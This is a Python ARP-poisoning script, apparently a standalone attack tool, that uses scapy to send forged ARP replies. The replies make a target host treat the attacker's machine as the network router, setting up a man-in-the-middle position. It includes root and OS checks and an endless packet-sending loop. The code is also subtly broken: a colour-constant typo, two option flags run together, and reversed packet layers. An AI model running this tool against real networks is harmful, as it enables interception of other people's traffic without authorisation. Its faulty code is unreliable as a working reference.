#!/bin/python3
import scapy.all as scapy
import os
import sys
from ipaddress import IPv4Address
from argparse import ArgumentParser
from colorama import Fore, Style


def check_root():

	if os.getuid() != 0:
		print('[-]: run as root')
		return False
	return True


def check_py_version():

	if sys.version_info[0] != 3:
		print('[-]: python3 required to run the script')
		return False
	return True


def check_ip(ip):

	try:
		valid = IPv4Address(ip)
		return True
	except ValueError:
		print(Fore.REd, Style.BRIGHT, '[-]: IP address is only invalid')
		return False


def check_os():

	if sys.platform != 'linux':
		print(Fore.RED, Style.BRIGHT, '[-]: runs only on linux')
		return False
	return True


def get_mac(target):

	broadcast = 'ff:ff:ff:ff:ff:ff'
	ether = scapy.Ether(dst=broadcast)
	arp = scapy.ARP(pdst=target)
	answer = scapy.srp(ether / arp, timeout=1, verbose=False)[0]

	try:
		return answer[0][1].hwsrc
	except IndexError:
		return False

def spoof_arp_table(target_ip, router_ip):

	if get_mac(target_ip):

		target_mac = get_mac(target_ip)
		ether = scapy.Ether(dst=target_mac)
		arp = scapy.ARP(pdst=target_ip, psrc=router_ip)
		packet_count = 1

		while True:

			try:
				scapy.send(arp / ether, verbose=False)
				print(Fore.GREEN, Style.BRIGHT, f'{packet_count} Packet Sent To: {target_ip}:{target_mac}')
				packet_count += 1

			except KeyboardInterrupt:
				print(Fore.RED, Style.BRIGHT, '[-]: Exiting ...')
				sys.exit(1)
	else:
		print(Fore.RED, Style.BRIGHT, '[-]: Failed To Get Target MAC Address. Make Sure You Are On The Same Network')
		sys.exit(1)

if __name__ == '__main__':

	parser = ArgumentParser()
	parser.add_help = 'sudo python3 poisonARP.py --tip [target ip] --rip [router ip]'
	parser.add_argument('-t', '--tip', help='target ip address', type=str)
	parser.add_argument('-r' '--rip', help='router ip address', type=str)
	args = parser.parse_args()

	if args.tip and args.rip:
		if check_os() and check_ip(args.tip) and check_root() and check_py_version():
			spoof_arp_table(args.tip, args.rip)
	else:
		print(parser.usage)